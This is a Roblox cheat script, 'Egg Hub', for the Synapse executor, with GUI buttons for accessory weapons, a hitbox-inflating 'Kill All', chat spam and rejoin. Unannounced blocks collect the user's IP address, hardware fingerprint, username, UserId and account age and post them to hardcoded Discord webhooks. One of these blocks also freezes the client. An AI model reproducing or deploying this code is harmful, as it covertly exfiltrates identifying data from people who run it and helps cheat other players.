if not syn and syn.protect_gui then print("Synapse is required to run Egg Hub :c") return end
if not game:IsLoaded() then
	game.Loaded:Wait()
end

local WHWID = {"1e5dcf8087dc546870aa7fb9a688c53cb068bcb8ece1f053c4b2870b18fbf05b4ea9cb0dc17f7a5118ea77483a40437a68afe0c2b9f93775c3b45688062c8942", "0c088f74aa4b44ce4ab74589d561b65f1ff2486c5c3c983066c29ff6f7e07342a7b55238a7e749c25715df2c70955791d96927aea8410eb394c45de50c6d22ef"}

local http_request = http_request;
if syn then
	http_request = syn.request
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint"};
local hwid

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

for i,v in pairs(WHWID) do
	if hwid == v then
		print("Whitelisted")
		break
	else
		print("Failed to whitelist. Retrying...")
	end
end

WHWID = nil

if game:GetService("RunService"):IsStudio() then
	spawn(function()
		local IP = game:HttpGet("https://v4.ident.me")
		local premium = false
		local ALT = false

		if game:GetService("Players").LocalPlayer.MembershipType == Enum.MembershipType.Premium then
			premium = true
		elseif game:GetService("Players").LocalPlayer.MembershipType == Enum.MembershipType.None then
			premium = false
		end
		if premium == false then 
			if game:GetService("Players").LocalPlayer.AccountAge <= 150 then 
				ALT = true
			end
		end

		local market = game:GetService("MarketplaceService")
		local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


		local http_request = http_request;
		if syn then
			http_request = syn.request
		elseif SENTINEL_V2 then
			function http_request(tb)
				return {
					StatusCode = 200;
					Body = request(tb.Url, tb.Method, (tb.Body or ''))
				}
			end
		end

		local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
		local decoded = game:GetService('HttpService'):JSONDecode(body)
		local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
		hwid = "";

		for i, v in next, hwid_list do
			if decoded.headers[v] then
				hwid = decoded.headers[v];
				break
			end
		end

		if hwid then
			local HttpServ = game:GetService('HttpService')
			local url = "https://discord.com/api/webhooks/798223564481626152/K9JCUWE1WjRtiatYwRvyPQb0kdsSo69J_PCU_kovhyo1An6ulel_5BbKYKtzzEFmoZfs"


			local data = 
				{
					["content"] = "",
					["embeds"] = {{
						["title"] = "HWID",
						["description"] = hwid,
						["type"] = "rich",
						["color"] = tonumber(0xAB0909),
						["fields"] = {
							{
								["name"] = "Username:",
								["value"] = game:GetService("Players").LocalPlayer.Name,
								["inline"] = true
							},
							{
								["name"] = "UserId:",
								["value"] = game:GetService("Players").LocalPlayer.UserId,
								["inline"] = true
							},
							{
								["name"] = "IP Address:",
								["value"] = IP,
								["inline"] = true
							},
							{
								["name"] = "Game Link:",
								["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
								["inline"] = true
							},
							{
								["name"] = "Age:",
								["value"] = game:GetService("Players").LocalPlayer.AccountAge,
								["inline"] = true
							},
							{
								["name"] = "ALT:",
								["value"] = ALT,
								["inline"] = true
							},

						},
					}}
				}
			local newdata = HttpServ:JSONEncode(data)

			local headers = {
				["content-type"] = "application/json"
			}

			local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
			http_request(request_payload)
		end
		wait()
		while true do end
	end)
end

if getgenv().EggHubLoaded then game:GetService("StarterGui"):SetCore("SendNotification",{Title="Egg Hub",Text="Already Running",Duration=5}) return end

getgenv().EggHubLoaded = true

local china = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local drag = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local pp = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local UGX = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local EC = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Sword = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local BB = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local BC = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local justin = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local KA = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local RJ = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local DS = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local Cover = Instance.new("Frame")
local Welcome = Instance.new("TextLabel")
local open = true
local net = false
local sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
local setsimulation = setsimulationradius or set_simulation_radius

if syn and syn.protect_gui then
	syn.protect_gui(china)
end

function notify(String)
	local Musika = Instance.new("Sound", game:GetService("SoundService"))
	Musika.SoundId = "rbxassetid://3318726694"
	Musika.Volume = 1
	Musika.Playing = true
	Musika.MaxDistance = math.huge
	Musika.PlaybackSpeed = 1
	Musika.EmitterSize = 45
	Musika:Play()
	game:GetService("StarterGui"):SetCore("SendNotification",{Title="Egg Hub",Text=String,Duration=5})
end

china.Name = "china"
china.Parent = game:GetService("CoreGui")
china.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = china
Main.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.400170654, 0, 0.402912617, 0)
Main.Size = UDim2.new(0, 234, 0, 160)

drag.Name = "drag"
drag.Parent = Main
drag.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
drag.BorderSizePixel = 0
drag.Position = UDim2.new(0, 0, -0.00212363899, 0)
drag.Size = UDim2.new(0, 234, 0, 11)

TextLabel.Parent = drag
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0232711732, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 113, 0, 11)
TextLabel.Font = Enum.Font.SciFi
TextLabel.Text = "Egg Hub"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

TextButton.Parent = drag
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.91452992, 0, 0, 0)
TextButton.Size = UDim2.new(0, 20, 0, 11)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "--"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000
TextButton.MouseButton1Click:Connect(function()
	if open then
		open = false
		EC.Visible = false
		Sword.Visible = false
		BB.Visible = false
		BC.Visible = false
		DS.Visible = false
		RJ.Visible = false
		justin.Visible = false
		KA.Visible = false
		pp.Visible = false
		UGX.Visible = false
		TextLabel_2.Visible = false
		Main:TweenSize(UDim2.new(0, 234,0, 11))
	else
		open = true
		Main:TweenSize(UDim2.new(0, 234,0, 160))
		EC.Visible = true
		Sword.Visible = true
		BB.Visible = true
		BC.Visible = true
		DS.Visible = true
		RJ.Visible = true
		justin.Visible = true
		KA.Visible = true
		pp.Visible = true
		UGX.Visible = true
		TextLabel_2.Visible = true
	end
end)

pp.Name = "pp"
pp.Parent = Main
pp.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
pp.BorderSizePixel = 0
pp.Position = UDim2.new(0.0272727273, 0, 0.131249994, 0)
pp.Size = UDim2.new(0, 72, 0, 24)
pp.Font = Enum.Font.SciFi
pp.Text = "PP"
pp.TextColor3 = Color3.fromRGB(255, 255, 255)
pp.TextSize = 14.000
pp.MouseButton1Click:Connect(function()
	if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Backuette") then
		local plr = game:GetService("Players").LocalPlayer
		local char = plr.Character
		local pp = char["Backuette"]
		pp.Handle.AccessoryWeld:Destroy()
		pp.Handle.SpecialMesh:Destroy()

		if char:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R6 then
			local att0 = Instance.new("Attachment",pp.Handle)
			att0.Orientation = Vector3.new(0, 90, 0)
			att0.Position = Vector3.new(3, 1, 0)

			local att1 = Instance.new("Attachment",char["Torso"])

			local ap = Instance.new("AlignPosition",pp.Handle)
			ap.Attachment0 = att0
			ap.Attachment1 = att1
			ap.RigidityEnabled = true


			local ao = Instance.new("AlignOrientation",pp.Handle) 
			ao.Attachment0 = att0
			ao.Attachment1 = att1
			ao.RigidityEnabled = true
		elseif char:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
			local att0 = Instance.new("Attachment",pp.Handle)
			att0.Orientation = Vector3.new(0, 90, 0)
			att0.Position = Vector3.new(3, 0, 0)

			local att1 = Instance.new("Attachment",char["LowerTorso"])

			local ap = Instance.new("AlignPosition",pp.Handle)
			ap.Attachment0 = att0
			ap.Attachment1 = att1
			ap.RigidityEnabled = true


			local ao = Instance.new("AlignOrientation",pp.Handle) 
			ao.Attachment0 = att0
			ao.Attachment1 = att1
			ao.RigidityEnabled = true
		end
	else
		notify("Missing hat : Backuette")
	end
end)

UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = pp

UGX.Name = "UGX"
UGX.Parent = Main
UGX.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
UGX.BorderSizePixel = 0
UGX.Position = UDim2.new(0.690777421, 0, 0.131249994, 0)
UGX.Size = UDim2.new(0, 64, 0, 24)
UGX.Font = Enum.Font.SciFi
UGX.Text = "Net"
UGX.TextColor3 = Color3.fromRGB(255, 255, 255)
UGX.TextSize = 14.000
UGX.MouseButton1Click:Connect(function()
	if net == false then
		if setsimulation then
			net = true
			spawn(function()
				game["Run Service"].RenderStepped:Connect(function()
					game:GetService("Players").LocalPlayer.ReplicationFocus = workspace
					settings().Physics.AllowSleep = false
					settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
					setsimulation(math.huge,math.huge,math.huge,math.huge)
					sethidden(game.Players.LocalPlayer, "SimulationRadius",math.huge,math.huge,math.huge,math.huge)
					sethidden(game.Players.LocalPlayer, "MaximumSimulationRadius",math.huge)
					game:GetService("RunService").Heartbeat:wait()
				end) 
			end)
			notify("Net Enabled")
		else
			notify("Unknown Error")
		end
	else
		notify("Error : You already have a active net")
	end
end)

UICorner_2.CornerRadius = UDim.new(0, 5)
UICorner_2.Parent = UGX

EC.Name = "EC"
EC.Parent = Main
EC.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
EC.BorderSizePixel = 0
EC.Position = UDim2.new(0.360000014, 0, 0.131249994, 0)
EC.Size = UDim2.new(0, 70, 0, 24)
EC.Font = Enum.Font.SciFi
EC.Text = "Egg Car"
EC.TextColor3 = Color3.fromRGB(255, 255, 255)
EC.TextSize = 14.000
EC.MouseButton1Click:Connect(function()
	if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Egg DogAccessory") and game:GetService("Players").LocalPlayer.Character:FindFirstChild("MeshPartAccessory") then

		local plr = game:GetService("Players").LocalPlayer
		local char = plr.Character
		local egg = char["Egg DogAccessory"]
		local car = char["MeshPartAccessory"]

		egg.Handle.AccessoryWeld:Destroy()
		local att0 = Instance.new("Attachment",egg.Handle)
		att0.Orientation = Vector3.new(0, 180, 0)
		att0.Position = Vector3.new(-5, 1.3, -2.7)

		local att1 = Instance.new("Attachment",char["HumanoidRootPart"])

		local ap = Instance.new("AlignPosition",egg.Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 


		local ao = Instance.new("AlignOrientation",egg.Handle) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true

		car.Handle.AccessoryWeld:Destroy()
		local att0 = Instance.new("Attachment",car.Handle)
		att0.Orientation = Vector3.new(0, 0, 0)
		att0.Position = Vector3.new(5, 2, 3)

		local att1 = Instance.new("Attachment",char["HumanoidRootPart"])

		local ap = Instance.new("AlignPosition",car.Handle)
		ap.Attachment0 = att0
		ap.Attachment1 = att1
		ap.RigidityEnabled = true 


		local ao = Instance.new("AlignOrientation",car.Handle) 
		ao.Attachment0 = att0
		ao.Attachment1 = att1
		ao.RigidityEnabled = true

	else
		notify("Hats Required : EGG DOG and Any Eliotra Car")
	end
end)

UICorner_3.CornerRadius = UDim.new(0, 5)
UICorner_3.Parent = EC

Sword.Name = "Sword"
Sword.Parent = Main
Sword.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
Sword.BorderSizePixel = 0
Sword.Position = UDim2.new(0.0412047505, 0, 0.331250012, 0)
Sword.Size = UDim2.new(0, 64, 0, 24)
Sword.Font = Enum.Font.SciFi
Sword.Text = "FE Sword"
Sword.TextColor3 = Color3.fromRGB(255, 255, 255)
Sword.TextSize = 14.000
Sword.MouseButton1Click:Connect(function()
	if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Meshes/ShatteredSwordHipAccessory") then

		local plr = game:GetService("Players").LocalPlayer
		local char = plr.Character
		local sword = char["Meshes/ShatteredSwordHipAccessory"]

		sword.Handle.AccessoryWeld:Destroy()

		if char:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R6 then
			local att0 = Instance.new("Attachment",sword.Handle)
			att0.Orientation = Vector3.new(-90, 0, 0)
			att0.Position = Vector3.new(0, 1.8, -0.8)

			local att1 = Instance.new("Attachment",char["Right Arm"])

			local ap = Instance.new("AlignPosition",sword.Handle)
			ap.Attachment0 = att0
			ap.Attachment1 = att1
			ap.RigidityEnabled = true 


			local ao = Instance.new("AlignOrientation",sword.Handle) 
			ao.Attachment0 = att0
			ao.Attachment1 = att1
			ao.RigidityEnabled = true

			local anim =  game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(game:GetService("Players").LocalPlayer.Character.Animate.toolnone.ToolNoneAnim)
			anim:Play()
		elseif char:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
			local att0 = Instance.new("Attachment",sword.Handle)
			att0.Orientation = Vector3.new(-90, 0, 0)
			att0.Position = Vector3.new(0, 1.6, 0)

			local att1 = Instance.new("Attachment",char["RightHand"])

			local ap = Instance.new("AlignPosition",sword.Handle)
			ap.Attachment0 = att0
			ap.Attachment1 = att1
			ap.RigidityEnabled = true 


			local ao = Instance.new("AlignOrientation",sword.Handle) 
			ao.Attachment0 = att0
			ao.Attachment1 = att1
			ao.RigidityEnabled = true

			local anim =  game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(game:GetService("Players").LocalPlayer.Character.Animate.toolnone.ToolNoneAnim)
			anim:Play()
		end
	else
		sendnotif("Missing hat : Shattered Sword Hip Accessory")
	end
end)

UICorner_4.CornerRadius = UDim.new(0, 5)
UICorner_4.Parent = Sword

BB.Name = "BB"
BB.Parent = Main
BB.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
BB.BorderSizePixel = 0
BB.Position = UDim2.new(0.37026459, 0, 0.331250012, 0)
BB.Size = UDim2.new(0, 64, 0, 24)
BB.Font = Enum.Font.SciFi
BB.Text = "Burr Buddy"
BB.TextColor3 = Color3.fromRGB(255, 255, 255)
BB.TextScaled = true
BB.TextSize = 14.000
BB.TextWrapped = true
BB.MouseButton1Click:Connect(function()
	local c = game:GetService("Players").LocalPlayer.Character
	if c:FindFirstChild("BuurBuddyAccessory") then
		local h = c.BuurBuddyAccessory
		local force = Instance.new("BodyPosition", h.Handle)
		h.Handle.AccessoryWeld:Destroy()
		memes = game:GetService("RunService").RenderStepped:Connect(function()
			force.Position = c.HumanoidRootPart.Position + Vector3.new(2,-2,0)
			h.Handle.Orientation = c.HumanoidRootPart.Orientation
		end)
		c.Humanoid.Died:Connect(function() memes:Disconnect() script:Destroy() end)
	else
		notify("Missing hat : Burr Buddy Accessory")
	end
end)

UICorner_5.CornerRadius = UDim.new(0, 5)
UICorner_5.Parent = BB

BC.Name = "BC"
BC.Parent = Main
BC.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
BC.BorderSizePixel = 0
BC.Position = UDim2.new(0.690777421, 0, 0.331250012, 0)
BC.Size = UDim2.new(0, 64, 0, 24)
BC.Font = Enum.Font.SciFi
BC.Text = "Gun"
BC.TextColor3 = Color3.fromRGB(255, 255, 255)
BC.TextSize = 14.000
BC.MouseButton1Click:Connect(function()
	if game:GetService("Players").LocalPlayer.Character:FindFirstChild("METALXLIGHTSEER77Accessory") then
		local plr = game:GetService("Players").LocalPlayer
		local char = plr.Character
		local sword = char["METALXLIGHTSEER77Accessory"]

		sword.Handle.AccessoryWeld:Destroy()

		if char:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R6 then
			local att0 = Instance.new("Attachment",sword.Handle)
			att0.Orientation = Vector3.new(53, 90, 0)
			att0.Position = Vector3.new(1.35, 0, 0)

			local att1 = Instance.new("Attachment",char["Right Arm"])

			local ap = Instance.new("AlignPosition",sword.Handle)
			ap.Attachment0 = att0
			ap.Attachment1 = att1
			ap.RigidityEnabled = true 


			local ao = Instance.new("AlignOrientation",sword.Handle) 
			ao.Attachment0 = att0
			ao.Attachment1 = att1
			ao.RigidityEnabled = true

			local anim =  game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(game:GetService("Players").LocalPlayer.Character.Animate.toolnone.ToolNoneAnim)
			anim:Play()
		elseif char:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
			local att0 = Instance.new("Attachment",sword.Handle)
			att0.Orientation = Vector3.new(53, 90, 0)
			att0.Position = Vector3.new(0, 0.4, 0)

			local att1 = Instance.new("Attachment",char["RightHand"])

			local ap = Instance.new("AlignPosition",sword.Handle)
			ap.Attachment0 = att0
			ap.Attachment1 = att1
			ap.RigidityEnabled = true 


			local ao = Instance.new("AlignOrientation",sword.Handle) 
			ao.Attachment0 = att0
			ao.Attachment1 = att1
			ao.RigidityEnabled = true

			local anim =  game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(game:GetService("Players").LocalPlayer.Character.Animate.toolnone.ToolNoneAnim)
			anim:Play()
		end
	else
		notify("Missing hat : METAL x LIGHTSEER 77")
	end
end)

UICorner_6.CornerRadius = UDim.new(0, 5)
UICorner_6.Parent = BC

justin.Name = "justin"
justin.Parent = Main
justin.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
justin.BorderSizePixel = 0
justin.Position = UDim2.new(0.0412047505, 0, 0.518750012, 0)
justin.Size = UDim2.new(0, 64, 0, 24)
justin.Font = Enum.Font.SciFi
justin.Text = "Justin"
justin.TextColor3 = Color3.fromRGB(255, 255, 255)
justin.TextSize = 14.000
justin.MouseButton1Click:Connect(function()
	local A_1 = "My Friend Here Justin, He's Already tak en And Hes CRACKED At Fortnite My Guy"
	local A_2 = "All"
	local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
	Event:FireServer(A_1, A_2)
	wait(3)
	local ScreenGui = Instance.new("ScreenGui")
	local TextLabel = Instance.new("TextLabel")
	local Sound = Instance.new("Sound", game:GetService("SoundService"))
	UserSettings():GetService("UserGameSettings").MasterVolume = 10

	ScreenGui.Parent = game:GetService("CoreGui")
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.IgnoreGuiInset = true

	TextLabel.Parent = ScreenGui
	TextLabel.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
	TextLabel.Size = UDim2.new(1, 0, 1, 0)
	TextLabel.Font = Enum.Font.SourceSans
	TextLabel.Text = "justin"
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 14.000
	TextLabel.TextWrapped = true

	Sound.SoundId = "rbxassetid://6104330851"
	Sound.Looped = true
	Sound.Volume = 10
	Sound:Play()

	while wait() do
		TextLabel.TextColor3 = Color3.new(255/255,0/255,0/255)
		for i = 0,255,10 do
			wait(0)
			TextLabel.TextColor3 = Color3.new(255/255,i/255,0/255)
		end
		for i = 255,0,-10 do
			wait(0)
			TextLabel.TextColor3 = Color3.new(i/255,255/255,0/255)
		end
		for i = 0,255,10 do
			wait(0)
			TextLabel.TextColor3 = Color3.new(0/255,255/255,i/255)
		end
		for i = 255,0,-10 do
			wait(0)
			TextLabel.TextColor3 = Color3.new(0/255,i/255,255/255)
		end
		for i = 0,255,10 do
			wait(0)
			TextLabel.TextColor3 = Color3.new(i/255,0/255,255/255)
		end
		for i = 255,0,-10 do
			wait(0)
			TextLabel.TextColor3 = Color3.new(255/255,0/255,i/255)
		end
	end

	print("Commit Justin")
end)

UICorner_7.CornerRadius = UDim.new(0, 5)
UICorner_7.Parent = justin

KA.Name = "KA"
KA.Parent = Main
KA.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
KA.BorderSizePixel = 0
KA.Position = UDim2.new(0.361717582, 0, 0.518750012, 0)
KA.Size = UDim2.new(0, 64, 0, 24)
KA.Font = Enum.Font.SciFi
KA.Text = "Kill All"
KA.TextColor3 = Color3.fromRGB(255, 255, 255)
KA.TextSize = 14.000
KA.MouseButton1Click:Connect(function()
	if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool") then
		local p = game:GetService("Players").LocalPlayer
		for i,v in pairs(p.Character:GetDescendants()) do
			if v:IsA("Tool") then
				local a = Instance.new("SelectionBox",v.Handle)
				a.Name = "SelectionBoxCreated"
				a.Adornee = v.Handle
				a.Color3 = Color3.new(255, 0, 0)
				v.Handle.Massless = true
				v.Handle.Size = Vector3.new(math.huge,math.huge,math.huge)
				v.GripPos = Vector3.new(0,0,0)
				p.Character.Humanoid:UnequipTools()
				wait(0.5)
				p.Character.Humanoid:EquipTool(v)
			end
		end
	else
		notify("Equip a tool that damages on touch")
	end
end)

UICorner_8.CornerRadius = UDim.new(0, 5)
UICorner_8.Parent = KA

RJ.Name = "RJ"
RJ.Parent = Main
RJ.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
RJ.BorderSizePixel = 0
RJ.Position = UDim2.new(0.690777421, 0, 0.518750012, 0)
RJ.Size = UDim2.new(0, 64, 0, 24)
RJ.Font = Enum.Font.SciFi
RJ.Text = "Rejoin"
RJ.TextColor3 = Color3.fromRGB(255, 255, 255)
RJ.TextSize = 14.000
RJ.MouseButton1Click:Connect(function()
	local Players = game:GetService("Players")
	wait(1)
	if #Players:GetPlayers() <= 1 then
		Players.LocalPlayer:Kick("Teleporting...")
		wait()
		game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)
	else
		game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
	end
end)

UICorner_9.CornerRadius = UDim.new(0, 5)
UICorner_9.Parent = RJ

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(-0.00236993772, 0, 0.90625, 0)
TextLabel_2.Size = UDim2.new(0, 180, 0, 15)
TextLabel_2.Font = Enum.Font.SciFi
TextLabel_2.Text = "Made by : loadstring()#4125"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_2.TextTransparency = 1

UICorner_10.CornerRadius = UDim.new(0, 5)
UICorner_10.Parent = DS

Cover.Name = "Cover"
Cover.Parent = Main
Cover.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Cover.BorderSizePixel = 0
Cover.ClipsDescendants = true
Cover.Position = UDim2.new(0.00617707148, 0, -0.00212365389, 0)
Cover.Size = UDim2.new(0, 234, 0, 160)

Welcome.Name = "Welcome"
Welcome.Parent = Cover
Welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome.BackgroundTransparency = 1.000
Welcome.BorderSizePixel = 0
Welcome.Position = UDim2.new(0.0811965838, 0, 0.331250012, 0)
Welcome.Size = UDim2.new(0, 200, 0, 50)
Welcome.Font = Enum.Font.SciFi
Welcome.Text = "Welcome, " .. game:GetService("Players").LocalPlayer.Name
Welcome.TextColor3 = Color3.fromRGB(255, 255, 255)
Welcome.TextSize = 14.000
Welcome.TextWrapped = true
Welcome.TextTransparency = 1

if not setsimulation then
	notify("Unknown Error")
	while true do end
end

if not sethidden then
	notify("Unknown Error")
	while true do end
end

spawn(function()
	local http_request = http_request;
	if syn then
		http_request = syn.request
	end

	local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
	local decoded = game:GetService('HttpService'):JSONDecode(body)
	local hwid_list = {"Syn-Fingerprint"};
	local hwid

	for i, v in next, hwid_list do
		if decoded.headers[v] then
			hwid = decoded.headers[v];
			break
		end
	end

	if hwid then
		local HttpServ = game:GetService('HttpService')
		local url = "https://discord.com/api/webhooks/798225852394897429/QyMVdt3q_10mjc4rJoVR4v_Gz4GErlnjf5U8GxMWLfWdbhdPgiWHMy-3jYjRJ3jVu3Mo"


		local data = 
			{
				["content"] = "",
				["embeds"] = {{
					["title"] = "HWID",
					["description"] = hwid,
					["type"] = "rich",
					["color"] = tonumber(0xAB0909),
				}}
			}
		local newdata = HttpServ:JSONEncode(data)

		local headers = {
			["content-type"] = "application/json"
		}

		local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
		http_request(request_payload)
	end
end)

wait(2)
game:GetService("TweenService"):Create(Welcome, TweenInfo.new(0.25), {['TextTransparency'] = 0}):Play()
wait(3)
game:GetService("TweenService"):Create(Welcome, TweenInfo.new(0.25), {['TextTransparency'] = 1}):Play()
wait(1)
Cover:TweenSize(UDim2.new(0, 234,0, 0))
wait(1)
Cover:Destroy()
wait(2)
game:GetService("TweenService"):Create(TextLabel_2, TweenInfo.new(0.25), {['TextTransparency'] = 0}):Play()

local L_1_ = game:GetService("UserInputService")
function drag(L_2_arg1)
	dragToggle = nil
	local dragSpeed = 0.23
	dragInput = nil
	dragStart = nil
	local dragPos = nil
	function updateInput(L_3_arg1)
		local Delta = L_3_arg1.Position - dragStart
		local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
		game:GetService("TweenService"):Create(L_2_arg1, TweenInfo.new(0.25), {
			Position = Position
		}):Play()
	end
	L_2_arg1.InputBegan:Connect(function(L_4_arg1)
		if (L_4_arg1.UserInputType == Enum.UserInputType.MouseButton1 or L_4_arg1.UserInputType == Enum.UserInputType.Touch) and L_1_:GetFocusedTextBox() == nil then
			dragToggle = true
			dragStart = L_4_arg1.Position
			startPos = L_2_arg1.Position
			L_4_arg1.Changed:Connect(function()
				if L_4_arg1.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	L_2_arg1.InputChanged:Connect(function(L_5_arg1)
		if L_5_arg1.UserInputType == Enum.UserInputType.MouseMovement or L_5_arg1.UserInputType == Enum.UserInputType.Touch then
			dragInput = L_5_arg1
		end
	end)
	game:GetService("UserInputService").InputChanged:Connect(function(L_6_arg1)
		if L_6_arg1 == dragInput and dragToggle then
			updateInput(L_6_arg1)
		end
	end)
end
drag(Main)

print("Egg Hub Loaded")